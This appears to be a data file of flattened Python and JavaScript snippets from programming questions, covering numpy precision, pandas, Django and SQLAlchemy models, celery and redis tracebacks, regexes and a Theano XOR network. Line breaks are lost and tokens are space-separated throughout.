limits the evaluation process to 10 evaluations . # Remove the below line to evaluate indefinitely . max_evals : 10 } eval_input_reader : { tf_record_input_reader { input_path : 'data/test.record ' } label_map_path : 'data/side_vehicle.pbtxt ' shuffle : false num_readers : 1 }"
"M = 4 # number of random valuesZ = 4 # number of additional zerosfor i in range ( 20 ) : a = np.random.rand ( M ) b = np.zeros ( M+Z ) b [ : M ] = a print a.sum ( ) - b.sum ( ) -4.4408920985e-160.00.00.04.4408920985e-160.0-4.4408920985e-160.00.00.00.00.00.00.00.02.22044604925e-160.04.4408920985e-164.4408920985e-160.0 a = np.array ( [ 0.1 , 1.0/3 , 1.0/7 , 1.0/13 , 1.0/23 ] ) b = np.array ( [ 0.1 , 0.0 , 1.0/3 , 0.0 , 1.0/7 , 0.0 , 1.0/13 , 1.0/23 ] ) print a.sum ( ) - b.sum ( ) = > -1.11022302463e-16print sum ( a ) - sum ( b ) = > 0.0"
"from decimal import Decimalimport numpy as npimport pandas as pda = [ Decimal ( 2.3 ) , Decimal ( 1.5 ) , Decimal ( 5.7 ) , Decimal ( 4.6 ) , Decimal ( 5.5 ) , Decimal ( 1.5 ) ] b = [ Decimal ( 2.1 ) , Decimal ( 1.2 ) , Decimal ( 5.3 ) , Decimal ( 4.4 ) , Decimal ( 5.3 ) , Decimal ( 1.7 ) ] h = [ 2.3,1.5,5.7,4.6,5.5,1.5 ] j = [ 2.1,1.2,5.3,4.4,5.3,1.7 ] corr_data1 = pd.DataFrame ( { ' A ' : a , ' B ' : b } ) corr_data2 = corr_data1.corr ( ) print ( corr_data2 ) corr_data3 = pd.DataFrame ( { ' H ' : h , ' J ' : j } ) corr_data4 = corr_data3.corr ( ) print ( corr_data4 ) Empty DataFrameColumns : [ ] Index : [ ] H JH 1.000000 0.995657J 0.995657 1.000000"
class Profile ( models.Model ) : user = models.OneToOneField ( User ) name = models.CharField ( max_length=140 ) p = Profile ( ) p.age = 42
"class Review ( db.Model ) : __tablename__ = 'Review ' id = db.Column ( db.Integer , primary_key = True ) user_id = db.Column ( db.Integer , db.ForeignKey ( 'User.id ' ) , nullable=False ) business_user_id = db.Column ( db.Integer , db.ForeignKey ( 'User.id ' ) , nullable=False ) user = db.relationship ( 'User ' , foreign_keys= [ user_id ] ) business_user = db.relationship ( 'User ' , foreign_keys= [ business_user_id ] ) class User ( db.Model ) : __tablename__ = 'User ' id = db.Column ( db.Integer , primary_key = True ) reviews = db.relationship ( 'Review ' , backref='user ' , lazy='dynamic ' )"
"> > > round ( 0.05,1 ) # this makes sense0.1 > > > round ( 0.15,1 ) # this does n't make sense ! Why is the result not 0.2 ? 0.1 > > > round ( 0.25,1 ) # this makes sense0.3 > > > round ( 0.35,1 ) # in my opinion , should be 0.4 but evaluates to 0.30.3"
"import randomdef main ( ) : d = { } used_keys = [ ] n = 0 while True : # choose a key unique enough among used previously key = random.randint ( 0 , 2 ** 60 ) d [ key ] = 1234 # the value does n't matter used_keys.append ( key ) n += 1 if n % 1000 == 0 : # clean up every 1000 iterations print 'thousand ' for key in used_keys : del d [ key ] used_keys [ : ] = [ ] # used_keys = [ ] if __name__ == '__main__ ' : main ( )"
"def ReadStream ( RXcount ) : global ftdi RXdata = ftdi.read ( RXcount ) RXdata = list ( struct.unpack ( str ( len ( RXdata ) ) + ' B ' , RXdata ) ) return RXdata def ProcessRawData ( RawData ) : if len ( RawData ) == 114733 : ProcessedMatrix = np.ndarray ( ( 1 , 114733 ) , dtype=int ) np.copyto ( ProcessedMatrix , RawData ) ProcessedMatrix = ProcessedMatrix [ : , 1 : -44 ] ProcessedMatrix = np.reshape ( ProcessedMatrix , ( -1 , 32 ) ) return ProcessedMatrix else : return None def GetFrame ( ProcessedMatrix ) : if np.shape ( ProcessedMatrix ) == ( 3584 , 32 ) : FrameArray = np.zeros ( ( 256 , 256 ) , dtype= ' B ' ) DataRows = ProcessedMatrix [ 13 : :14 ] for i in range ( 256 ) : RowData = `` '' for j in range ( 32 ) : RowData = RowData + `` { :08b } '' .format ( DataRows [ i , j ] ) FrameArray [ i ] = [ int ( RowData [ b : b+1 ] , 2 ) for b in range ( 256 ) ] return FrameArray else : return False def ReadStream ( RXcount ) : global ftdi return np.frombuffer ( ftdi.read ( RXcount ) , dtype=np.uint8 ) def ProcessRawData ( RawData ) : if len ( RawData ) == 114733 : return RawData [ 1 : -44 ] .reshape ( -1 , 32 ) return None def GetFrame ( ProcessedMatrix ) : if ProcessedMatrix.shape == ( 3584 , 32 ) : return np.unpackbits ( ProcessedMatrix [ 13 : :14 ] ) .reshape ( 256 , 256 ) return False"
"df1 = pd.DataFrame ( { 'Col1 ' : [ 'abc-def-ghi-jkl ' , 'jkl-ghi-jkl-mno ' ] , } ) List = df1 [ 'Col1 ] .str.split ( '- ' ) List 0 [ abc , def , ghi , jkl ] 1 [ jkl , ghi , jkl , mno ] Name : Col1 , dtype : object List = List.tolist ( ) [ [ 'abc ' , 'def ' , 'ghi ' , 'jkl ' ] , [ 'jkl ' , 'ghi ' , 'jkl ' , 'mno ' ] ] len ( List ) > len ( set ( List ) ) TypeError : unhashable type : 'list ' len ( List ) > len ( set ( List ) Col1 abc-def-ghi-jkl"
"from gevent.lock import BoundedSemaphoresem = BoundedSemaphore ( 1 ) @ app.task ( ignore_result=True , queue='request_queue ' ) def request_task ( url , *args , **kwargs ) : # make the request req = requests.get ( url ) request = { 'status_code ' : req.status_code , 'content ' : req.text , 'headers ' : dict ( req.headers ) , 'encoding ' : req.encoding } with sem : process_task.apply_async ( kwargs= { 'url ' : url , 'request ' : request } ) print ( f'Done - { url } ' ) cancel_wait_ex : [ Errno 9 ] File descriptor was closed in another greenlet File `` redis/connection.py '' , line 543 , in send_packed_command self._sock.sendall ( item ) File `` gevent/_socket3.py '' , line 424 , in sendall data_sent += self.send ( data_memory [ data_sent : ] , flags , timeout=timeleft ) File `` gevent/_socket3.py '' , line 394 , in send self._wait ( self._write_event ) File `` gevent/_socket3.py '' , line 156 , in _wait self.hub.wait ( watcher ) File `` gevent/hub.py '' , line 651 , in wait result = waiter.get ( ) File `` gevent/hub.py '' , line 898 , in get return self.hub.switch ( ) File `` gevent/hub.py '' , line 630 , in switch return RawGreenlet.switch ( self ) ConnectionError : Error 9 while writing to socket . File descriptor was closed in another greenlet . File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 556 , in send_packed_command ( errno , errmsg ) ) OSError : [ Errno 9 ] Bad file descriptor File `` redis/connection.py '' , line 126 , in _read_from_socket data = self._sock.recv ( socket_read_size ) File `` gevent/_socket3.py '' , line 332 , in recv return _socket.socket.recv ( self._sock , *args ) ConnectionError : Error while reading from socket : ( 9 , 'Bad file descriptor ' ) File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 538 , in send_packed_command self.connect ( ) File `` redis/connection.py '' , line 446 , in connect self.on_connect ( ) File `` redis/connection.py '' , line 520 , in on_connect if nativestr ( self.read_response ( ) ) ! = 'OK ' : File `` redis/connection.py '' , line 577 , in read_response response = self._parser.read_response ( ) File `` redis/connection.py '' , line 238 , in read_response response = self._buffer.readline ( ) File `` redis/connection.py '' , line 168 , in readline self._read_from_socket ( ) File `` redis/connection.py '' , line 143 , in _read_from_socket ( e.args , ) ) BlockingIOError : [ Errno 11 ] Resource temporarily unavailable File `` gevent/_socket3.py '' , line 390 , in send return _socket.socket.send ( self._sock , data , flags ) OSError : [ Errno 9 ] Bad file descriptor File `` redis/connection.py '' , line 543 , in send_packed_command self._sock.sendall ( item ) File `` gevent/_socket3.py '' , line 424 , in sendall data_sent += self.send ( data_memory [ data_sent : ] , flags , timeout=timeleft ) File `` gevent/_socket3.py '' , line 396 , in send return _socket.socket.send ( self._sock , data , flags ) ConnectionError : Error 9 while writing to socket . Bad file descriptor . File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 556 , in send_packed_command ( errno , errmsg ) ) BlockingIOError : [ Errno 11 ] Resource temporarily unavailable File `` gevent/_socket3.py '' , line 390 , in send return _socket.socket.send ( self._sock , data , flags ) OSError : [ Errno 9 ] Bad file descriptor File `` redis/connection.py '' , line 543 , in send_packed_command self._sock.sendall ( item ) File `` gevent/_socket3.py '' , line 424 , in sendall data_sent += self.send ( data_memory [ data_sent : ] , flags , timeout=timeleft ) File `` gevent/_socket3.py '' , line 396 , in send return _socket.socket.send ( self._sock , data , flags ) ConnectionError : Error 9 while writing to socket . Bad file descriptor . File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 556 , in send_packed_command ( errno , errmsg ) ) BlockingIOError : [ Errno 11 ] Resource temporarily unavailable File `` gevent/_socket3.py '' , line 390 , in send return _socket.socket.send ( self._sock , data , flags ) ConcurrentObjectUseError : This socket is already used by another greenlet : < bound method Waiter.switch of < gevent.hub.Waiter object at 0x7f271b53dea0 > > File `` celery/app/trace.py '' , line 374 , in trace_task R = retval = fun ( *args , **kwargs ) File `` celery/app/trace.py '' , line 629 , in __protected_call__ return self.run ( *args , **kwargs ) File `` drones/tasks.py '' , line 330 , in blue_drone_request_task blue_drone_process_task.apply_async ( kwargs= { 'targetpage ' : targetpage , 'request ' : request } ) File `` celery/app/task.py '' , line 536 , in apply_async **options File `` celery/app/base.py '' , line 736 , in send_task self.backend.on_task_call ( P , task_id ) File `` celery/backends/redis.py '' , line 189 , in on_task_call self.result_consumer.consume_from ( task_id ) File `` celery/backends/redis.py '' , line 76 , in consume_from self._consume_from ( task_id ) File `` celery/backends/redis.py '' , line 82 , in _consume_from self._pubsub.subscribe ( key ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 538 , in send_packed_command self.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 538 , in send_packed_command self.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2172 , in _execute connection.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2172 , in _execute connection.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2172 , in _execute connection.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 538 , in send_packed_command self.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 538 , in send_packed_command self.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2172 , in _execute connection.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2172 , in _execute connection.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 538 , in send_packed_command self.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2172 , in _execute connection.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 538 , in send_packed_command self.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2172 , in _execute connection.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2172 , in _execute connection.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 538 , in send_packed_command self.connect ( ) File `` redis/connection.py '' , line 455 , in connect callback ( self ) File `` redis/client.py '' , line 2120 , in on_connect self.subscribe ( **channels ) File `` redis/client.py '' , line 2229 , in subscribe ret_val = self.execute_command ( 'SUBSCRIBE ' , *iterkeys ( new_channels ) ) File `` redis/client.py '' , line 2161 , in execute_command self._execute ( connection , connection.send_command , *args ) File `` redis/client.py '' , line 2165 , in _execute return command ( *args ) File `` redis/connection.py '' , line 563 , in send_command self.send_packed_command ( self.pack_command ( *args ) ) File `` redis/connection.py '' , line 543 , in send_packed_command self._sock.sendall ( item ) File `` gevent/_socket3.py '' , line 424 , in sendall data_sent += self.send ( data_memory [ data_sent : ] , flags , timeout=timeleft ) File `` gevent/_socket3.py '' , line 394 , in send self._wait ( self._write_event ) File `` gevent/_socket3.py '' , line 150 , in _wait raise _socketcommon.ConcurrentObjectUseError ( 'This socket is already used by another greenlet : % r ' % ( watcher.callback , ) )"
"arr = [ [ 'Mohit ' , 'shini ' , 'Manoj ' , 'Mot ' ] , [ 'Mohit ' , 'shini ' , 'Manoj ' ] , [ 'Mohit ' , 'Vis ' , 'Nusrath ' ] ] # timegb % % timeitcollections.Counter ( chain.from_iterable ( arr ) ) .most_common ( 1 ) [ 0 ] [ 0 ] 5.91 µs ± 115 ns per loop ( mean ± std . dev . of 7 runs , 100000 loops each ) # Kevin Fang and Curious Mind % % timeitflat_list = [ item for sublist in arr for item in sublist ] collections.Counter ( flat_list ) .most_common ( 1 ) [ 0 ] 6.42 µs ± 501 ns per loop ( mean ± std . dev . of 7 runs , 100000 loops each ) % % timeitc = collections.Counter ( item for sublist in arr for item in sublist ) .most_common ( 1 ) c [ 0 ] [ 0 ] 6.79 µs ± 449 ns per loop ( mean ± std . dev . of 7 runs , 100000 loops each ) # Mayank Porwaldef most_common ( lst ) : return max ( set ( lst ) , key=lst.count ) % % timeitls = list ( chain.from_iterable ( arr ) ) most_common ( ls ) 2.33 µs ± 42.8 ns per loop ( mean ± std . dev . of 7 runs , 100000 loops each ) # U9-Forward % % timeitl= [ x for i in arr for x in i ] max ( l , key=l.count ) 2.6 µs ± 68.8 ns per loop ( mean ± std . dev . of 7 runs , 100000 loops each )"
"df = pd.DataFrame ( { ' B ' : [ 2,1,2 ] , ' C ' : [ ' a ' , ' b ' , ' a ' ] } ) B C0 2 ' a ' 1 1 ' b ' 2 2 ' a ' B C0 2 ' a ' 1 1 ' b ' 1 1 ' c ' 2 2 ' a '"
"import numpy as npind = np.ones ( ( 3,2,4 ) ) # shape= ( 3L , 2L , 4L ) dist = np.array ( [ [ 0.1,0.3 ] , [ 1,2 ] , [ 0,1 ] ] ) # shape= ( 3L , 2L ) ans = np.array ( [ np.dot ( dist [ i ] , ind [ i ] ) for i in xrange ( dist.shape [ 0 ] ) ] ) # shape= ( 3L , 4L ) print ans '' '' '' prints : [ [ 0.4 0.4 0.4 0.4 ] [ 3 . 3 . 3 . 3 . ] [ 1 . 1 . 1 . 1 . ] ] '' '' ''"
"Traceback ( most recent call last ) : File `` test.py '' , line 15 , in < module > get_category_links ( sys.argv ) File `` test.py '' , line 10 , in get_category_links response = urlopen ( url ) File `` /usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py '' , line 154 , in urlopen return opener.open ( url , data , timeout ) File `` /usr/local/Cellar/python/2.7.13/Frameworks/Python.framework/Versions/2.7/lib/python2.7/urllib2.py '' , line 420 , in open req.timeout = timeoutAttributeError : 'list ' object has no attribute 'timeout ' try : from urllib.request import urlopenexcept ImportError : from urllib2 import urlopenimport sysdef get_category_links ( url ) : response = urlopen ( url ) # do smth with response print ( response ) get_category_links ( sys.argv ) argv = [ ] # real value of type < class 'list ' > skipped def get_category_links ( url : str ) - > None : response = urlopen ( url ) # do smth with responseget_category_links ( sys.argv )"
"[ 1 , 1 , 2 , 2 , 2 , 3 , 3 , 3 , 3 , 4 , 4 , 4 , 5 , 5 , 5 , 5 , 5 , 5 , 5 ] import numpy as npbins = np.array ( [ 1 , 1 , 2 , 2 , 2 , 3 , 3 , 3 , 3 , 4 , 4 , 4 , 5 , 5 , 5 , 5 , 5 , 5 , 5 ] ) N = 3splits = np.split ( bins , np.where ( np.diff ( bins ) ! = 0 ) [ 0 ] +1 ) mask = [ ] for s in splits : if s.shape [ 0 ] < = N : mask.append ( np.ones ( s.shape [ 0 ] ) .astype ( np.bool_ ) ) else : mask.append ( np.append ( np.ones ( N ) , np.zeros ( s.shape [ 0 ] -N ) ) .astype ( np.bool_ ) ) mask = np.concatenate ( mask ) bins [ mask ] Out [ 90 ] : array ( [ 1 , 1 , 2 , 2 , 2 , 3 , 3 , 3 , 4 , 4 , 4 , 5 , 5 , 5 ] )"
"length = 1920 * 1080 * 4mymmap = mmap.mmap ( 0 , length + 11 , 'Name ' , mmap.ACCESS_WRITE ) image = capture.getImage ( ) # This returns a bytearray that is 4*1920*1080 in sizemymmap [ 11 : ( 11 + length ) ] = str ( image ) # This is the bottleneck according to the line profiler"
"accessibility , random good bye a11y , r4m g2d bye re.sub ( r '' ( [ A-Za-z ] ) ( [ A-Za-z ] { 2 , } ) ( [ A-Za-z ] ) '' , r '' \1 '' + str ( len ( r '' \2 '' ) ) + r '' \3 '' , s ) str.replace ( / ( [ A-Za-z ] ) ( [ A-Za-z ] { 2 , } ) ( [ A-Za-z ] ) /g , function ( m , $ 1 , $ 2 , $ 3 ) { return $ 1 + $ 2.length + $ 3 ; } ) ;"
class TestTemp ( ) : def __init__ ( self ) : print '__init__ ' self.even = 0 def setup ( self ) : print '__setup__ ' self.odd = 1 def test_even ( self ) : print 'test_even ' even_number = 10 assert even_number % 2 == self.even def test_odd ( self ) : print 'test_odd ' odd_number = 11 assert odd_number % 2 == self.odd __init____init____setup__test_even.__setup__test_odd .
"Hello { { world of the { { crazy } } { { need { { be } } } } sea } } there . Hello there . while 1 : firstStartBracket = text.find ( ' { { ' ) if ( firstStartBracket == -1 ) : break ; firstEndBracket = text.find ( ' } } ' ) if ( firstEndBracket == -1 ) : break ; secondStartBracket = text.find ( ' { { ' , firstStartBracket+2 ) ; lastEndBracket = firstEndBracket ; if ( secondStartBracket == -1 or secondStartBracket > firstEndBracket ) : text = text [ : firstStartBracket ] + text [ lastEndBracket+2 : ] ; continue ; innerBrackets = 2 ; position = secondStartBracket ; while innerBrackets : print innerBrackets ; # everytime we find a next start bracket before the ending add 1 to inner brackets else remove 1 nextEndBracket = text.find ( ' } } ' , position+2 ) ; nextStartBracket = text.find ( ' { { ' , position+2 ) ; if ( nextStartBracket ! = -1 and nextStartBracket < nextEndBracket ) : innerBrackets += 1 ; position = nextStartBracket ; # print text [ position-2 : position+4 ] ; else : innerBrackets -= 1 ; position = nextEndBracket ; # print text [ position-2 : position+4 ] ; # print nextStartBracket # print lastEndBracket lastEndBracket = nextEndBracket ; print 'pos ' , position ; text = text [ : firstStartBracket ] + text [ lastEndBracket+2 : ] ; Hello { { world of the { { crazy } } { { need { { be } } } } sea } } there { { my } } friend . Hello there friend ."
"[ logSettings ] eventlogs=applicationlogfilepath=C : \Programs\dk_test\results\dklog_009.loglevelvalue=10 [ formatters ] keys=dkeventFmt , dklogFmt [ handlers ] keys=dklogHandler [ handler_dklogHandler ] class=FileHandlerlevel= $ { logSettings : levelvalue } formatter=dklogFmtargs= ( $ { logSettings : logfilepath } , ' w ' ) [ logger_dklog ] level= $ { logSettings : levelvalue } handlers=dklogHandler"
"try : # first try imNo = int ( imBN.split ( 'S0001 ' ) [ -1 ] .replace ( '.tif ' , '' ) ) except : # second try imNo = int ( imBN.split ( 'S0001 ' ) [ -1 ] .replace ( '.tiff ' , '' ) ) except : # final try imNo = int ( imBN.split ( '_0_ ' ) [ -1 ] .replace ( '.tif ' , '' ) ) except : if imBN.find ( 'first ' ) > 0 : imNo = 1 if imBN.find ( 'second ' ) > 0 : imNo = 2 if imBN.find ( 'third ' ) > 0 : imNo = 3 ..."
// this is a commentvar x = 2 // and this is a comment toovar url = `` http : //www.google.com/ '' // and `` this '' toourl += 'but // this is not a comment ' // however this one isurl += 'this `` is not a comment ' + `` and ' neither is this `` // only this foo = 'http : //stackoverflow.com/ ' // these // are // comments // too // bar = 'http : //no.comments.com/ '
"import arrayimport sysimport timesize = 100 * 1000**2test = sys.argv [ 1 ] class ZeroIterable : def __init__ ( self , size ) : self.size = size self.next_index = 0 def next ( self ) : if self.next_index == self.size : raise StopIteration self.next_index = self.next_index + 1 return 0 def __iter__ ( self ) : return selft = time.time ( ) if test == ' Z ' : myarray = array.array ( ' L ' ) f = open ( '/dev/zero ' , 'rb ' ) myarray.fromfile ( f , size ) f.close ( ) elif test == ' L ' : myarray = array.array ( ' L ' , [ 0 ] * size ) elif test == 'S ' : myarray = array.array ( ' L ' , [ 0 ] ) * sizeelif test == ' I ' : myarray = array.array ( ' L ' , ZeroIterable ( size ) ) print time.time ( ) - t"
"import theanoimport theano.tensor as Timport theano.tensor.nnet as nnetimport numpy as npx = T.dvector ( ) y = T.dscalar ( ) def layer ( x , w ) : b = np.array ( [ 1 ] , dtype=theano.config.floatX ) new_x = T.concatenate ( [ x , b ] ) m = T.dot ( w.T , new_x ) # theta1 : 3x3 * x : 3x1 = 3x1 ; ; ; theta2 : 1x4 * 4x1 h = nnet.sigmoid ( m ) # # THIS SIGMOID RIGHT HERE return hdef grad_desc ( cost , theta ) : alpha = 0.1 # learning rate return theta - ( alpha * T.grad ( cost , wrt=theta ) ) theta1 = theano.shared ( np.array ( np.random.rand ( 3,3 ) , dtype=theano.config.floatX ) ) theta2 = theano.shared ( np.array ( np.random.rand ( 4,1 ) , dtype=theano.config.floatX ) ) hid1 = layer ( x , theta1 ) # hidden layerout1 = T.sum ( layer ( hid1 , theta2 ) ) # output layerfc = ( out1 - y ) **2 # cost expressioncost = theano.function ( inputs= [ x , y ] , outputs=fc , updates= [ ( theta1 , grad_desc ( fc , theta1 ) ) , ( theta2 , grad_desc ( fc , theta2 ) ) ] ) run_forward = theano.function ( inputs= [ x ] , outputs=out1 ) inputs = np.array ( [ [ 0,1 ] , [ 1,0 ] , [ 1,1 ] , [ 0,0 ] ] ) .reshape ( 4,2 ) # training data Xexp_y = np.array ( [ 1 , 1 , 0 , 0 ] ) # training data Ycur_cost = 0for i in range ( 2000 ) : for k in range ( len ( inputs ) ) : cur_cost = cost ( inputs [ k ] , exp_y [ k ] ) # call our Theano-compiled cost function , it will auto update weights if i % 500 == 0 : # only print the cost every 500 epochs/iterations ( to save space ) print ( 'Cost : % s ' % ( cur_cost , ) ) print ( run_forward ( [ 0,1 ] ) ) print ( run_forward ( [ 1,1 ] ) ) print ( run_forward ( [ 1,0 ] ) ) print ( run_forward ( [ 0,0 ] ) ) from theano.tensor.nnet import binary_crossentropy as cross_entropy # importsfc = cross_entropy ( out1 , y ) # cost expressionfor i in range ( 4000 ) : # training iteration Cost : 1.62724279493Cost : 0.545966632545Cost : 0.156764560912Cost : 0.0534911098234Cost : 0.0280394147992Cost : 0.0184933786794Cost : 0.0136444190935Cost : 0.01074828361590.9936520875770.008481941430550.9908293962850.00878482655791 File `` test.py '' , line 30 , in < module > ( theta1 , grad_desc ( fc , theta1 ) ) , File `` test.py '' , line 19 , in grad_desc return theta - ( alpha * T.grad ( cost , wrt=theta ) ) File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 545 , in grad grad_dict , wrt , cost_name ) File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 1283 , in _populate_grad_dict rval = [ access_grad_cache ( elem ) for elem in wrt ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 1241 , in access_grad_cache term = access_term_cache ( node ) [ idx ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 951 , in access_term_cache output_grads = [ access_grad_cache ( var ) for var in node.outputs ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 1241 , in access_grad_cache term = access_term_cache ( node ) [ idx ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 951 , in access_term_cache output_grads = [ access_grad_cache ( var ) for var in node.outputs ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 1241 , in access_grad_cache term = access_term_cache ( node ) [ idx ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 951 , in access_term_cache output_grads = [ access_grad_cache ( var ) for var in node.outputs ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 1241 , in access_grad_cache term = access_term_cache ( node ) [ idx ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 951 , in access_term_cache output_grads = [ access_grad_cache ( var ) for var in node.outputs ] File `` /usr/local/lib/python2.7/dist-packages/theano/gradient.py '' , line 1241 